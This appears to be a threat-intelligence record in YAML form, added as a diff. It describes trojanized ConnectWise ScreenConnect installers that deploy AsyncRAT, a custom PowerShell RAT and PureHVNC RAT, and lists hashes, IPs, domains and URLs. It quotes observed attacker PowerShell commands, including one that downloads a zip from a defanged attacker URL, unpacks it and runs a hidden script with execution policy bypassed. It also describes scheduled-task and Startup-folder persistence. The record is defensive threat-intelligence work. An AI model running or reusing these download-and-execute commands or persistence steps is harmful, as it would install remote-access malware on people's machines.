@@ -1,0 +1,84 @@
+description: Trojanized ConnectWise ScreenConnect installers are used for initial
+  access, followed by deployment of AsyncRAT, a custom PowerShell RAT, and PureHVNC
+  RAT.
+attribution: Unknown threat actor(s), activity observed in the United States
+malware_families:
+- AsyncRAT
+- Custom PowerShell RAT
+- PureHVNC RAT
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\\ProgramData\\Skype.ps1"
+  - powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\\Users\\Public\\Ab.vbs"
+  - powershell.exe -Command "& {Invoke-WebRequest -Uri \"hxxps://guilloton.fr/x.zip\"
+    -OutFile \"$env:ProgramData\\ali.zip\"; Expand-Archive -Path \"$env:ProgramData\\ali.zip\"
+    -DestinationPath \"$env:ProgramData\\\"; Start-Process powershell.exe -ArgumentList
+    \"-WindowStyle Hidden -ExecutionPolicy Bypass -File \\\"C:\\ProgramData\\Skype.ps1\\\"\"}"
+  scripting_engine:
+  - BypaasaUpdate.bat
+  - Microsoft.vbs
+  - NvContainerRecovery.ps1
+  - PureHVNC RAT
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: Skype.ps1
+    destination: 185.196.9.158
+    port: 4501-4503
+  - process: NvContainerRecovery.ps1
+    destination: 169.156.208.185
+    port: 8020
+  file_activity:
+  - C:\\ProgramData\\Skype.ps1
+  - C:\\ProgramData\\Microsoft.vbs
+  - C:\\Users\\Public\\Ab.vbs
+  - C:\\Users\\Public\\NvContainerRecovery.ps1
+  - C:\\Users\\Public\\logs.ldk
+  - C:\\Users\\Public\\logs.ldr
+  persistence:
+  - Scheduled task "Skype Updater" executing C:\\Users\\Public\\Ab.vbs at logon
+  - VBS script in Startup folder created by NvContainerRecovery.ps1
+  - Microsoft.vbs scheduled to run Skype.ps1 one minute after installation
+  process_relations: []
+IOCs:
+  hashes:
+  - MD5: 2EECA7166487DDC0B4C36B718DF31C93
+  - MD5: C92D37BC45F6088458C70C1CF53C06F6
+  - MD5: BA261666A657BDE2E8E071EE6E7D5357
+  - MD5: 34ED21AC2399CC08BD051A283FD59FCE
+  - MD5: A58719D9DDE0179C25215637766C2AB0
+  - MD5: 316119C77032A24822A64C86C1E4B2A0
+  - SHA256: 67A32455A94B3396AD956CBDDA81D8ED1CD3727315159E025299057118DEB6AC
+  - SHA256: BB182B8545B8C825811C6D09C738C230FE54BC96ADF1F10A3683B7E5294B5289
+  - SHA256: C260779FB1C9FF775739F6CF1853C9C33131ECF176737F6AF26B0AC60A6081DC
+  - SHA256: 53AAD05571E86F22E2C75ED4FA6C8F553C3EBD58DCA8BE9FE8A143784AEF29D7
+  - SHA256: 973A02FF597864E3920ED1041D24D629A0762CDE932EB69AEA066CD2235404F8
+  - SHA256: 1DA9428DF9A04E6CA1D836D1E941B61E30B6AF952D24D7B451A8D1E906ECE0C0
+  - SHA256: E7C482E66EFA99EA98E2C79BEB0A31C5120B73E4951A5F33133066B17E009DA1
+  - SHA256: A4BF71F97C3A2F3FDA496D204B5E744D6F1DA8D888ACE3867DA08D072AF01245
+  - SHA256: 6FA549F446A541856784695DB808DE2E5C67DA271C64ECC966C7C0B02622D58B
+  - SHA256: 10EEB21202E7EB055F9FAC37DAB96F86DFEB9F28C0510F33E4324D12087CACF2
+  - SHA256: 6AE546DA4D6D78D4262F3A2FF5E4F58C345294383ED9FF5E4DAA52466FE79E2F
+  - SHA256: B82E616E956A956FF5D9AFFCC13C907CF5054439FB5EE5A6F7AA5FFEE030DA56
+  - SHA256: EF66D80511CD46C5173BF13E750C51114EE891E833F4F256A23E7DE4790ACC73
+  ips:
+  - 169.156.208.185
+  - 185.196.9.158
+  - 185.196.8.100
+  domains:
+  - morco.rovider.net
+  - gaza.rovider.net
+  - lightc.rovider.net
+  - stealthrdp.com
+  urls:
+  - hxxps://eywordvailabom.com/sa/16-05.txt
+  - hxxps://systemwindowsupdate.com/alosh/logs.ldk
+  - hxxps://guilloton.fr/x.zip
+authors:
+- Ilia Dafchev
+- Eliad Kimhy
+reference: https://www.acronis.com/en/tru/posts/trojanized-screenconnect-installers-evolve-dropping-multiple-rats-on-a-single-machine
+date_of_publication: September 03, 2025
+file_creation_date: October 05, 2025
